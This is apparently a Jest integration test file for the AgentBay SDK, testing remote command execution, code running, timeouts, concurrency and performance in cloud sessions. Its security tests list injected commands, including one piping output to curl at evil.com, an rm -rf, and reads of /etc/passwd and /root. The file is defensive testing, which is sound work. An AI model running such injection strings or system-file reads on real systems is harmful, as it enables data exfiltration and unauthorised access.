import { describe, beforeEach, afterEach, test, expect } from '@jest/globals';
import { AgentBay } from '../../src/agent-bay';
import { Session } from '../../src/session';
import { Command } from '../../src/command';
import { Code } from '../../src/code';
import { log } from '../../src/utils/logger';

// Helper function for session creation
async function createSession(imageId?: string): Promise<{ agentBay: AgentBay; session: Session }> {
  const agentBay = new AgentBay({ apiKey: process.env.AGENTBAY_API_KEY || 'test-api-key' });
  const sessionResult = await agentBay.create(imageId ? { imageId } : {});
  expect(sessionResult.success).toBe(true);

  return {
    agentBay,
    session: sessionResult.session!
  };
}

describe('Command Comprehensive Tests', () => {
  let agentBay: AgentBay;
  let session: Session;
  let command: Command;
  let code: Code;

  beforeEach(async () => {
    // Use code_latest image uniformly to support runCode tests
    const sessionInfo = await createSession('code_latest');
    agentBay = sessionInfo.agentBay;
    session = sessionInfo.session;
    command = session.command;
    code = session.code;
  });

  afterEach(async () => {
    if (session) {
      await agentBay.delete(session);
    }
  });

  // 1. ExecuteCommand Function Tests
  describe('1. ExecuteCommand Function Tests', () => {
    test('TC-CMD-001: Basic Shell Command Execution', async () => {
      // Prerequisites: AgentBay instance created and connected normally, Session established successfully, Command object initialized
      // Test objective: Verify correct execution of basic shell commands

      const startTime = Date.now();
      const result = await command.executeCommand("echo 'Hello World'", 1000);
      const executionTime = Date.now() - startTime;

      // Verification points
      expect(result.success).toBe(true);
      expect(result.output).toContain('Hello World');
      expect(result.requestId).toBeDefined();
      expect(result.requestId).not.toBe('');
      expect(executionTime).toBeGreaterThan(0); // Execution time should be greater than 0

      log(`TC-CMD-001 execution time: ${executionTime}ms`);
    });

    test('TC-CMD-002: File Operation Command Execution', async () => {
      // Prerequisites: Session environment prepared, file system access permissions available
      // Test objective: Verify execution of file create, read, delete commands

      const testContent = 'test content';
      const testFile = '/tmp/test_file.txt';

      // Step 1: Execute create file command
      const createResult = await command.executeCommand(`echo '${testContent}' > ${testFile}`);
      expect(createResult.success).toBe(true);

      // Step 2: Execute read file command
      const readResult = await command.executeCommand(`cat ${testFile}`);
      expect(readResult.success).toBe(true);
      expect(readResult.output.trim()).toBe(testContent);

      // Step 3: Execute delete file command
      const deleteResult = await command.executeCommand(`rm ${testFile}`);
      expect(deleteResult.success).toBe(true);

      // Step 4: Verify file deletion
      const verifyResult = await command.executeCommand(`ls ${testFile}`);
      expect(verifyResult.success).toBe(false); // File not existing should return error
    });

    test('TC-CMD-003: Timeout Mechanism Verification', async () => {
      // Prerequisites: Session environment prepared, system supports sleep command
      // Test objective: Verify command execution timeout control mechanism

      const timeoutMs = 1000;
      const startTime = Date.now();

      const result = await command.executeCommand('sleep 5', timeoutMs);
      const actualTime = Date.now() - startTime;

      // Verification points
      expect(result.success).toBe(false);
      expect(actualTime).toBeLessThan(6000); // Should be interrupted within 5 seconds
      expect(actualTime).toBeGreaterThan(timeoutMs * 0.8); // Close to timeout time

      log(`TC-CMD-003 actual execution time: ${actualTime}ms, timeout: ${timeoutMs}ms`);
    });

    test('TC-CMD-004: Error Command Handling', async () => {
      // Prerequisites: Session environment prepared
      // Test objective: Verify error handling mechanism for invalid commands

      const result = await command.executeCommand('invalid_command_xyz');

      // Verification points
      expect(result.success).toBe(false);
      expect(result.errorMessage).toBeDefined();
      expect(result.errorMessage).not.toBe('');

      log(`TC-CMD-004 error message: ${result.errorMessage}`);
    });
  });

  // 2. RunCode Function Tests (reusing main session, already code_latest image)
  describe('2. RunCode Function Tests', () => {
    test('TC-CODE-001: Python Code Execution', async () => {
      // Prerequisites: Session environment prepared, Python runtime environment available
      // Test objective: Verify correct execution of Python code

      const pythonCode = "print('Hello from Python')";
      const result = await code.runCode(pythonCode, 'python', 60);

      // Verification points
      expect(result.success).toBe(true);
      expect(result.result).toContain('Hello from Python');
      expect(result.requestId).toBeDefined();

      log(`TC-CODE-001 result: ${result.result}`);
    });

    test('TC-CODE-002: JavaScript Code Execution', async () => {
      // Prerequisites: Session environment prepared, JavaScript runtime environment available
      // Test objective: Verify correct execution of JavaScript code

      const jsCode = "console.log('Hello from JavaScript')";
      const result = await code.runCode(jsCode, 'javascript', 60);

      // Verification points
      expect(result.success).toBe(true);
      expect(result.result).toContain('Hello from JavaScript');
      expect(result.requestId).toBeDefined();

      log(`TC-CODE-002 result: ${result.result}`);
    });

    test('TC-CODE-003: Complex Python Code Execution', async () => {
      // Prerequisites: Session environment prepared, Python standard library available
      // Test objective: Verify execution of Python code with data processing

      const complexPythonCode = `
import json
data = [1, 2, 3, 4, 5]
result = sum(data)
print(json.dumps({"sum": result, "count": len(data)}))
      `.trim();

      const result = await code.runCode(complexPythonCode, 'python', 300);

      // Verification points
      expect(result.success).toBe(true);

      // Parse JSON output
      const jsonMatch = result.result.match(/\{.*\}/);
      expect(jsonMatch).toBeTruthy();

      if (jsonMatch) {
        const parsedResult = JSON.parse(jsonMatch[0]);
        expect(parsedResult.sum).toBe(15);
        expect(parsedResult.count).toBe(5);
      }

      log(`TC-CODE-003 result: ${result.result}`);
    });

    test('TC-CODE-004: Code Execution Timeout Control', async () => {
      // Prerequisites: Session environment prepared
      // Test objective: Verify timeout control mechanism for code execution

      const longRunningCode = "import time; time.sleep(10)";
      const timeoutSeconds = 5;
      const startTime = Date.now();

      const result = await code.runCode(longRunningCode, 'python', timeoutSeconds);
      const actualTime = Date.now() - startTime;

      // Verification points
      expect(result.success).toBe(false);
      expect(actualTime).toBeLessThan(15000); // Should complete within 15 seconds (including network delay)
      expect(actualTime).toBeGreaterThan(timeoutSeconds * 1000 * 0.5); // Close to timeout time

      log(`TC-CODE-004 actual time: ${actualTime}ms, timeout: ${timeoutSeconds}s`);
    });

    test('TC-CODE-005: Unsupported Language Handling', async () => {
      // Prerequisites: Session environment prepared
      // Test objective: Verify error handling for unsupported languages

      const result = await code.runCode('System.out.println("Hello");', 'java', 60);

      // Verification points
      expect(result.success).toBe(false);
      expect(result.errorMessage).toBeDefined();
      expect(result.errorMessage!.toLowerCase()).toContain('language');

      log(`TC-CODE-005 error: ${result.errorMessage}`);
    });

    test('TC-CODE-006: Code Syntax Error Handling', async () => {
      // Prerequisites: Session environment prepared
      // Test objective: Verify handling of syntax error code

      const syntaxErrorCode = "print('unclosed string";
      const result = await code.runCode(syntaxErrorCode, 'python', 60);

      // Verification points
      expect(result.success).toBe(false);
      expect(result.errorMessage).toBeDefined();
      expect(result.errorMessage!.toLowerCase()).toMatch(/(syntax|error)/);

      log(`TC-CODE-006 syntax error: ${result.errorMessage}`);
    });
  });

  // 3. Concurrent Execution Tests
  describe('3. Concurrent Execution Tests', () => {
    test('TC-CONCURRENT-001: Concurrent Command Execution', async () => {
      // Prerequisites: Multiple Sessions established, system supports concurrent operations
      // Test objective: Verify concurrent execution capability of multiple commands

      // Create multiple sessions (using default image, command execution doesn't need code_latest)
      const sessions: Session[] = [];
      const agentBays: AgentBay[] = [];

      try {
        for (let i = 0; i < 3; i++) {
          const sessionInfo = await createSession(); // Don't specify imageId, use default
          agentBays.push(sessionInfo.agentBay);
          sessions.push(sessionInfo.session);
        }

        // Execute different commands concurrently
        const commands = [
          "echo 'Command 1'",
          "echo 'Command 2'",
          "echo 'Command 3'"
        ];

        const startTime = Date.now();
        const promises = sessions.map((sess, index) =>
          sess.command.executeCommand(commands[index])
        );

        const results = await Promise.all(promises);
        const concurrentTime = Date.now() - startTime;

        // Verification points
        results.forEach((result, index) => {
          expect(result.success).toBe(true);
          expect(result.output).toContain(`Command ${index + 1}`);
        });

        log(`TC-CONCURRENT-001 concurrent execution time: ${concurrentTime}ms`);

      } finally {
        // Clean up sessions
        for (let i = 0; i < sessions.length; i++) {
          await agentBays[i].delete(sessions[i]);
        }
      }
    });

    test('TC-CONCURRENT-002: Mixed Code Concurrent Execution', async () => {
      // Prerequisites: Session established, both Python and JavaScript environments available
      // Test objective: Verify concurrent execution of different language codes

      // Reuse main session (already code_latest image)
      const pythonCode = "print('Python result')";
      const jsCode = "console.log('JavaScript result')";

      const startTime = Date.now();
      const [pythonResult, jsResult] = await Promise.all([
        code.runCode(pythonCode, 'python', 60),
        code.runCode(jsCode, 'javascript', 60)
      ]);
      const concurrentTime = Date.now() - startTime;

      // Verification points
      expect(pythonResult.success).toBe(true);
      expect(jsResult.success).toBe(true);
      expect(pythonResult.result).toContain('Python result');
      expect(jsResult.result).toContain('JavaScript result');

      log(`TC-CONCURRENT-002 mixed execution time: ${concurrentTime}ms`);
    });
  });

  // 4. Performance Tests
  describe('4. Performance Tests', () => {
    test('TC-PERF-001: Command Execution Performance Baseline', async () => {
      // Prerequisites: Stable test environment, no other high-load tasks
      // Test objective: Establish command execution performance baseline

      const iterations = 10; // Reduce iterations to suit test environment
      const executionTimes: number[] = [];
      let successCount = 0;

      for (let i = 0; i < iterations; i++) {
        const startTime = Date.now();
        const result = await command.executeCommand(`echo 'Test ${i}'`);
        const executionTime = Date.now() - startTime;

        executionTimes.push(executionTime);
        if (result.success) {
          successCount++;
        }
      }

      // Calculate statistics
      const avgTime = executionTimes.reduce((a, b) => a + b, 0) / executionTimes.length;
      const maxTime = Math.max(...executionTimes);
      const minTime = Math.min(...executionTimes);
      const sortedTimes = [...executionTimes].sort((a, b) => a - b);
      const p99Time = sortedTimes[Math.floor(0.99 * sortedTimes.length)];

      // Verification points
      expect(avgTime).toBeLessThan(5000); // Adjust to 5 seconds to accommodate network delay
      expect(p99Time).toBeLessThan(10000); // 99% requests complete within 10 seconds
      expect(successCount / iterations).toBeGreaterThanOrEqual(0.8); // 80% success rate

      log(`TC-PERF-001 Performance: Avg=${avgTime}ms, Min=${minTime}ms, Max=${maxTime}ms, P99=${p99Time}ms, Success=${successCount}/${iterations}`);
    });

    test('TC-PERF-002: Code Execution Performance Test', async () => {
      // Prerequisites: Stable test environment
      // Test objective: Test performance of code execution

      // Reuse main session (already code_latest image)
      const pythonIterations = 5;
      const jsIterations = 5;
      const pythonTimes: number[] = [];
      const jsTimes: number[] = [];

      // Python performance test
      for (let i = 0; i < pythonIterations; i++) {
        const startTime = Date.now();
        await code.runCode(`print('Python test ${i}')`, 'python', 60);
        pythonTimes.push(Date.now() - startTime);
      }

      // JavaScript performance test
      for (let i = 0; i < jsIterations; i++) {
        const startTime = Date.now();
        await code.runCode(`console.log('JS test ${i}')`, 'javascript', 60);
        jsTimes.push(Date.now() - startTime);
      }

      const avgPythonTime = pythonTimes.reduce((a, b) => a + b, 0) / pythonTimes.length;
      const avgJsTime = jsTimes.reduce((a, b) => a + b, 0) / jsTimes.length;

      // Verification points
      expect(avgPythonTime).toBeLessThan(10000); // Python average execution time < 10 seconds
      expect(avgJsTime).toBeLessThan(10000); // JavaScript average execution time < 10 seconds

      log(`TC-PERF-002 Code Performance: Python Avg=${avgPythonTime}ms, JS Avg=${avgJsTime}ms`);
    });
  });

  // 5. Security Tests
  describe('5. Security Tests', () => {
    test('TC-SEC-001: Command Injection Protection', async () => {
      // Prerequisites: Session environment prepared, system has security protection mechanisms
      // Test objective: Verify system prevents command injection attacks

      const maliciousCommands = [
        "echo test; rm -rf /tmp/test_malicious",
        "echo test | curl http://evil.com || true",
        "echo test & sleep 1"
      ];

      for (const maliciousCommand of maliciousCommands) {
        const result = await command.executeCommand(maliciousCommand);

        // Verification points: Commands should be executed safely or blocked
        // System should remain stable and not execute dangerous operations
        expect(result.requestId).toBeDefined(); // Request should be processed

        log(`TC-SEC-001 Malicious command result: ${maliciousCommand} -> Success: ${result.success}`);
      }
    });
    test('TC-SEC-003: Permission Control Verification', async () => {
      // Prerequisites: Session environment prepared, system has permission control mechanisms
      // Test objective: Verify permission control for command and code execution

      const restrictedCommands = [
        "id && echo 'user_info_accessed'", // User info access test, replacing sudo
        "cat /etc/passwd | head -3 2>/dev/null || echo 'access_controlled'", // System file access
        "ls /root 2>/dev/null || echo 'root_access_denied'", // Root directory access test
        "chmod 777 /tmp/test_file 2>/dev/null || echo 'permission_denied'" // Permission modification
      ];

      for (const restrictedCommand of restrictedCommands) {
        const result = await command.executeCommand(restrictedCommand);

        // Verification points: Permission control should be effective
        expect(result.requestId).toBeDefined();

        log(`TC-SEC-003 Permission test: ${restrictedCommand} -> Success: ${result.success}`);
      }
    });
  });

  // 6. Boundary Tests
  describe('6. Boundary Tests', () => {
    test('TC-BOUNDARY-001: Extremely Long Command Handling', async () => {
      // Prerequisites: Session environment prepared
      // Test objective: Verify handling capability for extremely long commands

      // Construct long command (1KB)
      const longString = 'x'.repeat(1000);
      const longCommand = `echo '${longString}'`;

      const result = await command.executeCommand(longCommand);

      // Verification points
      expect(result.requestId).toBeDefined();
      // System should be able to handle long commands or give reasonable errors
      if (result.success) {
        expect(result.output).toContain(longString);
      } else {
        expect(result.errorMessage).toBeDefined();
      }

      log(`TC-BOUNDARY-001 Long command (${longCommand.length} chars): Success=${result.success}`);
    });

    test('TC-BOUNDARY-002: Large Output Handling', async () => {
      // Prerequisites: Session environment prepared
      // Test objective: Verify handling capability for large output

      // Command that generates large output
      const result = await command.executeCommand('seq 1 100'); // Output 1-100

      // Verification points
      expect(result.requestId).toBeDefined();
      if (result.success) {
        expect(result.output.split('\n').length).toBeGreaterThan(50);
      }

      log(`TC-BOUNDARY-002 Large output: Success=${result.success}, Output length=${result.output.length}`);
    });

    test('TC-BOUNDARY-003: Special Character Handling', async () => {
      // Prerequisites: Session environment prepared
      // Test objective: Verify handling of special characters and encoding

      const specialChars = [
        "echo 'Special: !@#$%^&*()'",
        "echo 'Unicode: 你好世界 🌍'",
        "echo Quotes: 'double' and 'single'",
        "echo 'Newlines:\nand\ttabs'"
      ];

      for (const specialCommand of specialChars) {
        const result = await command.executeCommand(specialCommand);

        // Verification points
        expect(result.requestId).toBeDefined();

        log(`TC-BOUNDARY-003 Special chars: ${specialCommand} -> Success=${result.success}`);
      }
    });
  });

  // 7. Data Integrity and Consistency Tests
  describe('7. Data Integrity Tests', () => {
    test('should maintain command execution consistency', async () => {
      // Verify consistency of command execution
      const testCommand = "echo 'consistency test'";
      const iterations = 5;
      const results: string[] = [];

      for (let i = 0; i < iterations; i++) {
        const result = await command.executeCommand(testCommand);
        expect(result.success).toBe(true);
        results.push(result.output.trim());
      }

      // Verify all results should be consistent
      const firstResult = results[0];
      results.forEach(result => {
        expect(result).toBe(firstResult);
      });

      log(`Data integrity test: All ${iterations} executions returned consistent results`);
    });

    test('should handle session state correctly', async () => {
      // Verify correct handling of session state
      expect(session.sessionId).toBeDefined();
      expect(session.sessionId).not.toBe('');
      expect(command).toBeDefined();
      expect(code).toBeDefined();

      // Verify association between command object and session
      const result = await command.executeCommand("echo 'session test'");
      expect(result.success).toBe(true);
      expect(result.requestId).toBeDefined();

      log(`Session state test: SessionId=${session.sessionId}, Command available=${!!command}`);
    });
  });
});
